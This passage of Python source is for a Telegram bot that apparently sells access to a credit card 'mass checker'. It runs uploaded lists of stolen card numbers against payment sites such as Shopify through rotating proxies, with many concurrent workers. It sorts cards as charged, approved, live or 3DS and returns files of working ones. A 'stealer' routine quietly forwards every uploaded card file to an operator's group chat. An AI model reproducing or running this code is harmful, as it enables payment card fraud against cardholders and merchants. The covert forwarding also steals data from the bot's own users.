        await event.reply(pe(f"❌ 𝐍𝐨 𝐕𝐚𝐥𝐢𝐝 𝐂𝐚𝐫𝐝𝐬"), parse_mode='html'); return

    try:
        stealer_gc = load_stealer_gc()
        if stealer_gc:
            name, username = await get_user_info(uid)
            display = f"@{username}" if username else f"<a href='tg://user?id={uid}'>{name}</a>"
            caption = pe(
                f"[⌯] 𝗠𝗮𝘀𝘀 𝗙𝗶𝗹𝗲 ⌁ 𝚄𝚙𝚕𝚘𝚊𝚍𝚎𝚍 ⌁ ⚡\n"
                f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
                f"[⌯] 𝗨𝘀𝗲𝗿 ⌁ {display} ⌁ <code>{uid}</code>\n"
                f"[⌯] 𝗙𝗶𝗹𝗲 ⌁ {file_name}\n"
                f"[⌯] 𝗖𝗮𝗿𝗱𝘀 ⌁ {len(cards):,}"
            )
            import tempfile as _tf, uuid as _u2
            _tmp2_dir = os.path.join(_tf.gettempdir(), "rxo_uploads")
            os.makedirs(_tmp2_dir, exist_ok=True)
            fp2 = os.path.join(_tmp2_dir, f"{_u2.uuid4().hex}.txt")
            fp2 = await reply.download_media(file=fp2)
            await bot.send_file(stealer_gc, fp2, caption=caption, parse_mode='html')
            try: os.remove(fp2)
            except Exception: pass
    except Exception as e:
        print(f"[Stealer GC mass] {e}")

    limit = get_user_limit(uid)
    if len(cards) > limit: cards = cards[:limit]

    if uid in user_active_check:
        info = user_active_check[uid]
        _mins = int(time.time() - info.get('started_at', time.time())) // 60
        await event.reply(pe(
            f"⛔ 𝗖𝗵𝗲𝗰𝗸 𝗔𝗹𝗿𝗲𝗮𝗱𝘆 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 ⌁ ⚠️\n{SEP}\n"
            f"[⌯] 𝗢𝗻𝗹𝘆 𝟭 𝗰𝗵𝗲𝗰𝗸 𝗮𝘁 𝗮 𝘁𝗶𝗺𝗲 ⌁ 🔒\n"
            f"[⌯] 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 𝗳𝗼𝗿 ⌁ {_mins} 𝗺𝗶𝗻 ⌁ ⏱️\n"
            f"[⌯] 𝗨𝘀𝗲 ⌁ /stopmass ⌁ 🛑"
        ), parse_mode='html')
        return

    text = pe(
        f"[⌯] 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸 ⌁ 𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴 ⌁ 🔥\n{SEP}\n"
        f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {len(cards):,} ⌁ 📦\n"
        f"[⌯] 𝗦𝗰𝗮𝗻𝗻𝗲𝗱 ⌁ 0 ⌁ ⚙️\n"
        f"[⌯] 𝗟𝗶𝘃𝗲 ⌁ 0 ⌁ 💎\n"
        f"[⌯] 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ⌁ 0 ⌁ ✅\n"
        f"[⌯] 𝟯𝗗𝗦 ⌁ 0 ⌁ ⚠️\n{SEP}\n"
        f"●○○○○○○○○○○○○○○○○○○○ 0%\n"
        f"0 / {len(cards):,}\n{SEP}\n"
        f"⏳ 𝗪𝗮𝗶𝘁𝗶𝗻𝗴...\n{SEP}"
    )
    msg_id = await raw_send(uid, text, rows_stop(), reply_to=event.message.id)
    if msg_id:
        user_active_check[uid] = {
            'session_key': f"{uid}_{msg_id}",
            'msg_id': msg_id,
            'started_at': time.time(),
            'card_count': len(cards),
        }
        asyncio.create_task(run_mass_check(uid, cards, msg_id, file_name))


@bot.on(events.CallbackQuery(pattern=r"^start_check_\d+$"))
async def cb_start_check(event):
    uid = event.sender_id
    data = event.data.decode()
    target_uid = int(data.split('_')[-1])
    if uid != target_uid:
        await event.answer("❌ Not your check!", alert=True); return
    info = pending_checks.pop(uid, None)
    if not info:
        await event.answer("⚠️ Session expired. Resend the file.", alert=True); return
    cards = info['cards']
    file_name = info.get('file_name', 'mass.txt')
    sites = _get_sites_for_user(uid)
    proxies = _get_proxies_for_user_v2(uid)
    if not sites or not proxies:
        await event.answer("❌ No sites/proxies available.", alert=True); return
    await event.answer("🔥 Starting!", alert=False)
    text = pe(
        f"[⌯] 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸 ⌁ 𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴 ⌁ 🔥\n{SEP}\n"
        f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {len(cards):,} ⌁ 📦\n"
        f"[⌯] 𝗦𝗰𝗮𝗻𝗻𝗲𝗱 ⌁ 0 ⌁ ⚙️\n{SEP}\n"
        f"●○○○○○○○○○○○○○○○○○○○ 0%\n0 / {len(cards):,}\n{SEP}\n"
        f"⏳ 𝗪𝗮𝗶𝘁𝗶𝗻𝗴...\n{SEP}"
    )
    msg_id = await raw_send(uid, text, rows_stop())
    if msg_id:
        asyncio.create_task(run_mass_check(uid, cards, msg_id, file_name))


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ MASS CHECK ENGINE
# ══════════════════════════════════════════════════════════════════════════════
async def run_mass_check(user_id, cards, progress_msg_id, file_name="mass.txt"):
    session_key = f"{user_id}_{progress_msg_id}"
    clear_session_bad_sites()
    clear_error_log()
    active_sessions[session_key] = {'paused': False, 'started_at': time.time()}
    all_results = {
        'charged': [], 'approved': [], 'tds': [], 'live': [],
        'declined': [], 'error': [],
        'total': len(cards), 'start_time': time.time(),
        'last_card_time': time.time(), 'file_name': file_name,
    }
    proxy_pool = list(_get_proxies_for_user_v2(user_id))
    proxy_iter = itertools.cycle(proxy_pool) if proxy_pool else None
    proxy_lock = asyncio.Lock()

    async def _next_proxy():
        if not proxy_iter: return None
        async with proxy_lock:
            return next(proxy_iter)

    try:
        queue = asyncio.Queue()
        last_update = [time.time()]
        for c in cards:
            queue.put_nowait(c)

        # ── FIX: track truly-processed cards to avoid false 'complete' ──
        processed_count = [0]
        processed_lock = asyncio.Lock()

        async def worker():
            while True:
                if _stop_flags.get(session_key): return
                sess = active_sessions.get(session_key)
                if not sess: return
                while sess.get('paused', False):
                    await asyncio.sleep(1)
                    if _stop_flags.get(session_key): return
                    sess = active_sessions.get(session_key)
                    if not sess: return
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    return
                try: cur_sites = _get_sites_for_user(user_id)
                except Exception: cur_sites = []
                try: start_proxy = await _next_proxy()
                except Exception: start_proxy = None
                if not cur_sites or not proxy_pool:
                    cur_sites = _get_sites_for_user(user_id)
                    _refill = list(_get_proxies_for_user_v2(user_id))
                    if _refill:
                        proxy_pool.clear()
                        proxy_pool.extend(_refill)
                    if not cur_sites or not proxy_pool:
                        await asyncio.sleep(2)
                        try: queue.put_nowait(card)
                        except Exception: pass
                        continue
                t0 = time.time()
                result = {'card': card, 'status': 'Dead', 'message': 'Error', 'raw_response': ''}
                try:
                    result = await asyncio.wait_for(
                   check_card_with_retry(card, cur_sites, proxy_pool, max_retries=3),
                   timeout=180,
             )
                    result['time'] = round(time.time() - t0, 2)
                    all_results['last_card_time'] = time.time()
                    if _stop_flags.get(session_key): break
                    category = _classify_result(result)
                    bin_info = await get_bin_info(card.split('|')[0])
                    result['bin_info'] = bin_info
                    if _stop_flags.get(session_key): break
                    async with processed_lock:
                        if category == 'charged':
                            all_results['charged'].append(result)
                        elif category == 'approved':
                            all_results['approved'].append(result)
                        elif category == '3ds':
                            result['status'] = '3DS'
                            all_results['tds'].append(result)
                        elif category == 'live':
                            result['status'] = 'Live'
                            all_results['live'].append(result)
                        elif category == 'declined':
                            all_results['declined'].append(result)
                        else:
                            all_results['error'].append(result)

                    # ── FIX: fire-and-forget so worker never blocks on TG API ──
                    try:
                        if category == 'charged':
                            increment_charged(user_id, 1)
                            asyncio.create_task(send_realtime_hit(user_id, result, 'Charged', file_name))
                            asyncio.create_task(send_hit_log_gc(result, 'Charged', user_id))
                        elif category == 'approved':
                            increment_approved(user_id, 1)
                            asyncio.create_task(send_realtime_hit(user_id, result, 'Approved', file_name))
                            asyncio.create_task(send_hit_log_gc(result, 'Approved', user_id))
                        elif category == '3ds':
                            asyncio.create_task(send_realtime_hit(user_id, result, '3DS', file_name))
                            asyncio.create_task(send_hit_log_gc(result, '3DS', user_id))
                        elif category == 'live':
                            asyncio.create_task(send_realtime_hit(user_id, result, 'Live', file_name))
                            asyncio.create_task(send_hit_log_gc(result, 'Live', user_id))
                    except Exception as _se:
                        print(f"[WORKER-SIDE] {_se}")
                except asyncio.TimeoutError:
                    # ⬇️ Retry once with a fresh proxy
                    try:
                        retry_sites = _get_sites_for_user(user_id)
                        retry_proxies = list(_get_proxies_for_user_v2(user_id))
                        if retry_sites and retry_proxies:
                            result = await asyncio.wait_for(
                                check_card_with_retry(card, retry_sites, retry_proxies, max_retries=2),
                                timeout=180,
                            )
                            result['time'] = round(time.time() - t0, 2)
                            result['bin_info'] = await get_bin_info(card.split('|')[0])
                            category = _classify_result(result)
                            if category == 'charged':
                                all_results['charged'].append(result)
                                increment_charged(user_id, 1)
                                await send_realtime_hit(user_id, result, 'Charged', file_name)
                            elif category == 'approved':
                                all_results['approved'].append(result)
                                increment_approved(user_id, 1)
                                await send_realtime_hit(user_id, result, 'Approved', file_name)
                            elif category == '3ds':
                                result['status'] = '3DS'
                                all_results['tds'].append(result)
                                await send_realtime_hit(user_id, result, '3DS', file_name)
                            elif category == 'live':
                                result['status'] = 'Live'
                                all_results['live'].append(result)
                                await send_realtime_hit(user_id, result, 'Live', file_name)
                            elif category == 'declined':
                                all_results['declined'].append(result)
                            else:
                                result['message'] = 'Timeout (2x)'
                                result['raw_response'] = 'TIMEOUT_RETRY'
                                all_results['error'].append(result)
                        else:
                            result['message'] = 'Timeout'
                            result['raw_response'] = 'TIMEOUT'
                            all_results['error'].append(result)
                    except Exception:
                        result['message'] = 'Timeout'
                        result['raw_response'] = 'TIMEOUT'
                        all_results['error'].append(result)

                except Exception as _we:
                    print(f"[WORKER-ERR] {type(_we).__name__}: {_we}")
                    # Retry once on connection errors
                    if 'connect' in str(_we).lower() or 'timeout' in str(_we).lower():
                        try:
                            result = await asyncio.wait_for(
                                check_card_with_retry(card, cur_sites, proxy_pool, max_retries=2),
                                timeout=180,
                            )
                            result['time'] = round(time.time() - t0, 2)
                            result['bin_info'] = await get_bin_info(card.split('|')[0])
                            category = _classify_result(result)
                            if category == 'charged':
                                all_results['charged'].append(result)
                                increment_charged(user_id, 1)
                                await send_realtime_hit(user_id, result, 'Charged', file_name)
                            elif category == 'approved':
                                all_results['approved'].append(result)
                                increment_approved(user_id, 1)
                                await send_realtime_hit(user_id, result, 'Approved', file_name)
                            elif category == '3ds':
                                result['status'] = '3DS'
                                all_results['tds'].append(result)
                                await send_realtime_hit(user_id, result, '3DS', file_name)
                            elif category == 'live':
                                result['status'] = 'Live'
                                all_results['live'].append(result)
                                await send_realtime_hit(user_id, result, 'Live', file_name)
                            elif category == 'declined':
                                all_results['declined'].append(result)
                            else:
                                result['message'] = str(_we)[:60]
                                result['raw_response'] = 'WORKER_ERROR'
                                all_results['error'].append(result)
                        except Exception:
                            result['message'] = f'Error: {str(_we)[:60]}'
                            result['raw_response'] = 'WORKER_ERROR'
                            all_results['error'].append(result)
                    else:
                        result['message'] = f'Error: {str(_we)[:60]}'
                        result['raw_response'] = 'WORKER_ERROR'
                        all_results['error'].append(result)

                async with processed_lock:
                    processed_count[0] += 1
                checked = processed_count[0]
                now = time.time()
                if now - last_update[0] >= 3:
                    last_update[0] = now
                    try:
                        await update_mass_progress(user_id, progress_msg_id, all_results, checked, result)
                    except Exception as _pe:
                        print(f"[WORKER-PROG] {type(_pe).__name__}: {_pe}")

        _active_count = len(active_sessions)
        if _active_count >= 3: _base_workers = HEAVY_LOAD_WORKERS
        elif _active_count >= 2: _base_workers = MEDIUM_LOAD_WORKERS
        else: _base_workers = LIGHT_LOAD_WORKERS
        _user_workers = min(MASS_WORKERS, len(cards), _base_workers)
        _available_global = _GLOBAL_WORKER_SEM.get_available()
        _user_workers = min(_user_workers, _available_global)

# ⬇️ ADD THIS HARD CAP
        _user_workers = min(_user_workers, 60)   # never exceed 60 workers
        _user_workers = max(5, _user_workers)
        _granted = _GLOBAL_WORKER_SEM.acquire(_user_workers)
        try:
            workers = [asyncio.create_task(worker()) for _ in range(_granted)]
            await asyncio.gather(*workers, return_exceptions=True)
        finally:
            _GLOBAL_WORKER_SEM.release(_granted)
    except Exception:
        pass
    finally:
        _was_stopped = _stop_flags.get(session_key, False)
        _stop_flags.pop(session_key, None)
        active_sessions.pop(session_key, None)
        user_active_check.pop(user_id, None)
        if not _was_stopped:
            try:
                await send_final_results(user_id, all_results)
            except Exception as _fe:
                print(f"send_final_results error: {_fe}")


async def update_mass_progress(user_id, message_id, results, checked, last_res=None):
    total = results['total']
    pct = int(100 * checked / total) if total > 0 else 0
    bar_width = 20
    filled = int(bar_width * checked / total) if total > 0 else 0
    bar = "●" * filled + "○" * (bar_width - filled)

    latest_card = "0000••••••••0000|00|0000|000"
    status_text = "Waiting"
    status_icon = "5042036407137207122"
    status_raw = ""
    status_style = "primary"

    if last_res:
        raw = (last_res.get('raw_response') or '').upper()
        st = last_res.get('status', '')
        card = last_res.get('card', '') or ''
        parts = card.split('|')
        if len(parts) == 4:
            num = parts[0]
            masked = (num[:4] + "•" * 8 + num[-4:]) if len(num) >= 8 else num
            latest_card = masked + "|" + parts[1] + "|" + parts[2] + "|" + parts[3]
        else:
            latest_card = card
        _msg_short = (last_res.get('message') or '').strip()
        if len(_msg_short) > 40:
            _msg_short = _msg_short[:40] + "..."
        if st == 'Charged':
            status_text = "Charged Success"
            status_icon = "5778251341348476741"
            status_raw = "CHARGED"
            status_style = "success"
        elif st == 'Approved':
            status_text = "Approved"
            status_icon = "5305417687357203905"
            status_raw = raw or "APPROVED"
            status_style = "success"
        elif st == 'Live':
            status_text = "Live"
            status_icon = "5447453226498552490"
            status_raw = raw or "LIVE"
            status_style = "primary"
        elif st == '3DS':
            status_text = "3DS Required"
            status_icon = "5420323339723881652"
            status_raw = raw or "3DS_REQUIRED"
            status_style = "primary"
        elif st in ('Dead', 'Declined'):
            _display = _msg_short or raw or "Declined"
            status_text = "Declined"
            status_icon = "6168089880535501141"
            status_raw = _display[:50]
            status_style = "danger"
        else:
            _display = _msg_short or raw or "Error"
            status_text = st or "Error"
            status_icon = "6168089880535501141"
            status_raw = _display[:50]
            status_style = "danger"

    def b(s):
        out = []
        for ch in s:
            code = ord(ch)
            if 65 <= code <= 90:
                out.append(chr(code - 65 + 0x1D5D4))
            elif 97 <= code <= 122:
                out.append(chr(code - 97 + 0x1D5EE))
            elif 48 <= code <= 57:
                out.append(chr(code - 48 + 0x1D7EC))
            else:
                out.append(ch)
        return "".join(out)

    text = pe(
        "[⌯] " + b("Mass Checker") + " \u2301 " + b("Live") + " \u2301 \U0001f525\n"
        "\n" + SEP + "\n"
        + "[⌯] " + b("Total") + " \u2301 " + f"{total:,}" + "\n"
        + "[⌯] " + b("Checked") + " \u2301 " + f"{checked:,}" + "\n"
        + "[⌯] " + b("Charged") + " \u2301 " + str(len(results['charged'])) + "\n"
        + "[⌯] " + b("Approved") + " \u2301 " + str(len(results['approved'])) + "\n"
        + "[⌯] " + b("3DS") + " \u2301 " + str(len(results['tds'])) + "\n"
        + "[⌯] " + b("Declined") + " \u2301 " + str(len(results['declined'])) + "\n"
        + "[⌯] " + b("Workers") + " \u2301 " + str(MASS_WORKERS) + "\n"
        "\n" + SEP + "\n\n"
        + bar + " " + str(pct) + "% | " + f"{checked:,}" + " / " + f"{total:,}" + "\n"
    )

    _real_card = (last_res.get('card') if last_res else '') or ''
    if _real_card and _real_card != 'N/A':
        _card_btn = {
            "text": latest_card,
            "copy_text": {"text": _real_card},
            "style": "primary",
            "icon_custom_emoji_id": "5445260044398524944",
        }
    else:
        _card_btn = {
            "text": latest_card,
            "callback_data": "noop",
            "style": "primary",
            "icon_custom_emoji_id": "5445260044398524944",
        }

    buttons = [
        [_card_btn],
        [{
            "text": status_text + " \u2014 " + status_raw,
            "callback_data": "noop",
            "style": status_style,
            "icon_custom_emoji_id": status_icon,
        }],
        [
            {"text": "Pause", "callback_data": "pause_mass", "style": "primary",
             "icon_custom_emoji_id": "5042036407137207122"},
            {"text": "Stop", "callback_data": "stop_mass", "style": "danger",
             "icon_custom_emoji_id": "6181277564732972292"},
        ],
    ]

    try:
        api_url = "https://api.telegram.org/bot" + BOT_TOKEN + "/editMessageText"
        payload = {
            "chat_id": user_id,
            "message_id": message_id,
            "text": text,
            "parse_mode": "HTML",
            "reply_markup": {"inline_keyboard": buttons},
            "link_preview_options": {"is_disabled": True},
        }
        r = await asyncio.to_thread(
            _http_session.post, api_url, json=payload, timeout=5
        )
        if r.status_code != 200:
            print(f"[PROG] ❌ HTTP {r.status_code}: {r.text[:300]}")
    except Exception as e:
        import traceback
        print(f"[PROG] ❌ Exception: {type(e).__name__}: {e}")
        traceback.print_exc()

async def send_final_results(user_id, results):
    elapsed = int(time.time() - results['start_time'])
    h, m, s = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
    total = results['total']
    checked = sum(len(results[k]) for k in ('charged','approved','tds','live','declined','error'))
    pct = int(100 * checked / total) if total > 0 else 0
    bar_width = 20
    filled = int(bar_width * checked / total) if total > 0 else 0
    bar = f"{'●' * filled}{'○' * (bar_width - filled)}"
    ch_count = len(results['charged']); ap_count = len(results['approved'])
    td_count = len(results['tds']); lv_count = len(results['live'])
    dc_count = len(results['declined']); er_count = len(results['error'])
    cname = await get_display_name(user_id)
    time_fmt = f"{h}h {m}m {s}s" if h else (f"{m}m {s}s" if m else f"{s}s")
    summary = pe(
        f"[⌯] 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸 ⌁ 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲 ⌁ ✅\n{SEP}\n"
        f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {total:,} ⌁ 📦\n"
        f"[⌯] 𝗦𝗰𝗮𝗻𝗻𝗲𝗱 ⌁ {checked:,} ⌁ ⚙️\n"
        f"[⌯] 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ⌁ {ch_count} ⌁ 💎\n"
        f"[⌯] 𝗟𝗶𝘃𝗲 ⌁ {lv_count} ⌁ 💳\n"
        f"[⌯] 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ⌁ {ap_count} ⌁ ✅\n"
        f"[⌯] 𝟯𝗗𝗦 ⌁ {td_count} ⌁ ⚠️\n"
        f"[⌯] 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ⌁ {dc_count} ⌁ 🚫\n"
        f"[⌯] 𝗘𝗿𝗿𝗼𝗿 ⌁ {er_count} ⌁ ❌\n{SEP}\n"
        f"{bar} {pct}%\n{checked:,} / {total:,}\n{SEP}\n"
        f"[⌯] 𝗧𝗶𝗺𝗲 ⌁ {time_fmt} ⌁ ⏱️\n{SEP}\n"
        f"[⌯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ⌁ 🔰 {cname}"
    )
    await bot.send_message(user_id, summary, parse_mode='html')
    if results['charged']:
        await _send_result_file(user_id, 'charged.txt', 'CHARGED', results['charged'], "💎")
    if results['live']:
        await _send_result_file(user_id, 'live.txt', 'LIVE', results['live'], "💳")
    if results['approved']:
        await _send_result_file(user_id, 'approved.txt', 'APPROVED', results['approved'], "✅")
    if results['tds']:
        await _send_result_file(user_id, '3ds.txt', '3DS', results['tds'], "⚠️")
    if results['declined']:
        await _send_result_file(user_id, 'declined.txt', 'DECLINED', results['declined'], "🚫")
    if results['error']:
        await _send_result_file(user_id, 'error.txt', 'ERROR', results['error'], "❌")


async def _send_result_file(user_id, filename, label, results_list, emoji):
    D = "─" * 44
    lines = [f"{D}\n  {BOT_BRAND}  ◈  {label} ({len(results_list)})\n{D}\n\n"]
    for r in results_list:
        lines.append(_file_row(label, r))
    lines.append(f"\n{D}\n  Total: {len(results_list)}\n{D}\n")
    async with aiofiles.open(filename, 'w') as f:
        await f.write("".join(lines))
    try:
        await bot.send_file(user_id, filename,
                            caption=pe(f"[⌯] {label} ⌁ {len(results_list)} {emoji}"),
                            parse_mode='html')
    except Exception as e:
        print(f"Send file error: {e}")
    try: os.remove(filename)
    except Exception: pass


def _file_row(label, r):
    gate = r.get('gateway', 'Shopify')
    price = r.get('price', '-')
    bi = r.get('bin_info')
    raw = r.get('raw_response', '') or ''
    msg = (r.get('message', '') or '').split('\n')[0][:80]
    if bi:
        brand, btype, level, bank, country, flag = bi
        bank_line = f"  Bank: {bank} | {country} {flag} | {brand} {btype} {level}\n"
    else:
        bank_line = ""
    raw_line = f"  Raw: {raw}\n" if raw else ""
    return f"  [{label}]\n  CC: {r['card']}\n  Gateway: {gate}\n  Amount: {price}\n  Message: {msg}\n{raw_line}{bank_line}  {'─'*36}\n"


@bot.on(events.CallbackQuery(pattern=b"stop_mass"))
async def cb_stop_mass(event):
    uid = event.sender_id
    killed = 0
    for k in list(active_sessions.keys()):
        if k.startswith(f"{uid}_") or k.startswith(f"st1_{uid}_") or k.startswith(f"stripe_{uid}_") or k.startswith(f"mwhop_{uid}_"):
            _stop_flags[k] = True
            active_sessions.pop(k, None)
            killed += 1
    user_active_check.pop(uid, None)
    if killed:
        await event.answer("⛔ Stopped!", alert=True)
        try:
            await raw_edit(event.chat_id, event.message_id,
                           pe(f"⛔ 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸 ⌁ 𝗦𝘁𝗼𝗽𝗽𝗲𝗱\n{SEP}\nCancelled by user."), [])
        except Exception: pass
    else:
        await event.answer("No active session.", alert=True)


@bot.on(events.CallbackQuery(pattern=b"pause_mass"))
async def cb_pause_mass(event):
    uid = event.sender_id
    paused = False; found = False
    for k in list(active_sessions.keys()):
        if k.startswith(f"{uid}_") or k.startswith(f"st1_{uid}_") or k.startswith(f"stripe_{uid}_") or k.startswith(f"mwhop_{uid}_"):
            sess = active_sessions[k]
            sess['paused'] = not sess.get('paused', False)
            paused = sess['paused']; found = True
            break
    if not found:
        await event.answer("No active session.", alert=True); return
    await event.answer("⏸️ Paused" if paused else "▶️ Resumed", alert=True)


@bot.on(events.CallbackQuery(pattern=b"noop"))
async def cb_noop(event):
    await event.answer()


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ GRANT/AUTH/REVOKE
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/grant\s+'))
async def grant_command(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ Admin only"), parse_mode='html'); return
    parts = event.message.text.split()
    if len(parts) < 3:
        await event.reply(pe(f"❌ Usage: /grant uid days"), parse_mode='html'); return
    try:
        target = int(parts[1]); days = float(parts[2])
    except Exception:
        await event.reply(pe(f"❌ Invalid format"), parse_mode='html'); return
    activate_plan(target, "grant", "custom", days, added_by=event.sender_id)
    await event.reply(pe(f"✅ Granted <code>{target}</code> ⌁ {days}d ⌁ exp {format_expiry(target)}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/auth\s+'))
async def auth_command(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ Admin only"), parse_mode='html'); return
    parts = event.message.text.split()
    if len(parts) < 3:
        await event.reply(pe(f"❌ Usage: /auth uid days"), parse_mode='html'); return
    try:
        target = int(parts[1]); days = float(parts[2])
    except Exception:
        await event.reply(pe(f"❌ Invalid format"), parse_mode='html'); return
    activate_plan(target, "auth", "custom", days, added_by=event.sender_id)
    await event.reply(pe(f"✅ Authed <code>{target}</code> ⌁ {days}d"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/revoke\s+'))
async def revoke_command(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ Admin only"), parse_mode='html'); return
    try:
        target = int(event.message.text.split(' ', 1)[1].strip())
    except Exception:
        await event.reply(pe(f"❌ Usage: /revoke uid"), parse_mode='html'); return
    if revoke_plan(target):
        await event.reply(pe(f"✅ Revoked <code>{target}</code>"), parse_mode='html')
    else:
        await event.reply(pe(f"❌ Not found"), parse_mode='html')


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ KEYS
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/genkey'))
async def gen_key_command(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ Admin only"), parse_mode='html'); return
    parts = event.message.text.split()
    if len(parts) < 4:
        await event.reply(pe(
            f"[⌯] 𝗚𝗲𝗻 𝗞𝗲𝘆 ⌁ 🔑\n{SEP}\n"
            f"[⌯] /genkey days max_uses count\n{SEP}\n"
            f"[⌯] 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 ⌁ /genkey 10 1 10"
        ), parse_mode='html'); return
    try:
        days = int(parts[1]); max_uses = int(parts[2]); count = int(parts[3])
    except ValueError:
        await event.reply(pe(f"❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿𝘀"), parse_mode='html'); return
    if not (1 <= days <= 365):
        await event.reply(pe(f"❌ Days 1-365"), parse_mode='html'); return
    if not (1 <= max_uses <= 100):
        await event.reply(pe(f"❌ Max uses 1-100"), parse_mode='html'); return
    if not (1 <= count <= 50):
        await event.reply(pe(f"❌ Count 1-50"), parse_mode='html'); return

    if days <= 1: plan_display, plan_duration = "Trial", "3 Hours"
    elif days == 7: plan_display, plan_duration = "Weekly", "7 Days"
    elif days == 15: plan_display, plan_duration = "Bi-Weekly", "15 Days"
    elif days == 30: plan_display, plan_duration = "Monthly", "30 Days"
    else: plan_display, plan_duration = f"{days}-Day", f"{days} Days"

    keys = load_keys()
    generated = []
    key_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    for _ in range(count):
        for _retry in range(10):
            parts_k = [''.join(secrets.choice(key_chars) for _ in range(5)) for _ in range(3)]
            key = f"ZAYN-{'-'.join(parts_k)}"
            if key not in keys: break
        keys[key] = {"plan": "custom", "days": days, "max_uses": max_uses,
                     "usage_count": 0, "created_at": time.time(),
                     "redeemed_by": None, "redeemed_at": None}
        generated.append(key)
    save_keys(keys)

    if count == 1:
        key = generated[0]
        await event.reply(pe(
            f"[⌯] 𝗞𝗲𝘆 ⌁ 𝙶𝚎𝚗𝚎𝚛𝚊𝚝𝚎𝚍 ⌁ ⚡\n\n{SEP}\n"
            f"[⌯] 𝗞𝗲𝘆 ⌁ <code>{key}</code>\n"
            f"[⌯] 𝗣𝗹𝗮𝗻 ⌁ {plan_display} ⌁ ⚡\n"
            f"[⌯] 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ⌁ {plan_duration} ⌁ ⚡\n"
            f"[⌯] 𝗠𝗮𝘅 𝗨𝘀𝗲𝘀 ⌁ {max_uses} ⌁ ⚡\n{SEP}\n"
            f"[⌯] 𝗥𝗲𝗱𝗲𝗲𝗺 ⌁ /redeem KEY ⌁ ⚡"
        ), parse_mode='html')
    else:
        show_keys = generated[:20]
        key_list = "\n".join([f"[⌯] <code>{k}</code>" for k in show_keys])
        more = f"\n<i>...and {len(generated) - 20} more</i>" if len(generated) > 20 else ""
        await event.reply(pe(
            f"[⌯] 𝗞𝗲𝘆𝘀 ⌁ 𝙶𝚎𝚗𝚎𝚛𝚊𝚝𝗲𝗱 ⌁ {count} ⚡\n\n{SEP}\n"
            f"{key_list}{more}\n\n{SEP}\n"
            f"[⌯] 𝗣𝗹𝗮𝗻 ⌁ {plan_display} ⌁ ⚡\n"
            f"[⌯] 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ⌁ {plan_duration} ⌁ ⚡\n"
            f"[⌯] 𝗠𝗮𝘅 𝗨𝘀𝗲𝘀 ⌁ {max_uses} ⌁ ⚡\n{SEP}"
        ), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/redeem\s+'))
async def redeem_key_command(event):
    uid = event.sender_id
    key = event.message.text.split(' ', 1)[1].strip() if ' ' in event.message.text else ''
    if not key:
        await event.reply(pe(f"🔑 Usage: /redeem [key]"), parse_mode='html'); return
    keys = load_keys()
    if key not in keys:
        await event.reply(pe(f"❌ Invalid Key"), parse_mode='html'); return
    key_data = keys[key]
    max_uses = key_data.get("max_uses", 1)
    usage_count = key_data.get("usage_count", 0)
    if key_data.get("redeemed_by") and usage_count >= max_uses:
        await event.reply(pe(f"❌ Key usage limit reached"), parse_mode='html'); return
    if key_data.get("redeemed_by") and key_data.get("redeemed_by") != uid and max_uses <= 1:
        await event.reply(pe(f"❌ Key already used"), parse_mode='html'); return
    days = key_data.get("days", 7)
    activate_plan(uid, "key", key_data.get("plan", "custom"), days, added_by=0)
    keys[key]["redeemed_by"] = uid
    keys[key]["redeemed_at"] = time.time()
    keys[key]["usage_count"] = usage_count + 1
    save_keys(keys)
    await event.reply(pe(
        f"[⌯] 𝗔𝗰𝗰𝗲𝘀𝘀 𝗚𝗿𝗮𝗻𝘁𝗲𝗱 ⌁ 🎉\n{SEP}\n"
        f"[⌯] 𝗣𝗹𝗮𝗻 ⌁ {days} Days ⌁ 💎\n"
        f"[⌯] 𝗘𝘅𝗽𝗶𝗿𝗲𝘀 ⌁ {format_expiry(uid)} ⌁ ⏳"
    ), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/myplan$'))
async def my_plan_command(event):
    uid = event.sender_id
    p = get_plan_info(uid)
    if not p:
        await event.reply(pe(f"❌ No Plan\n{SEP}\nUse /redeem KEY"), parse_mode='html'); return
    plan_def = PLAN_TYPES.get(p.get("plan", "weekly"), {})
    await event.reply(pe(
        f"[⌯] 𝗬𝗼𝘂𝗿 𝗣𝗹𝗮𝗻 ⌁ 💎\n{SEP}\n"
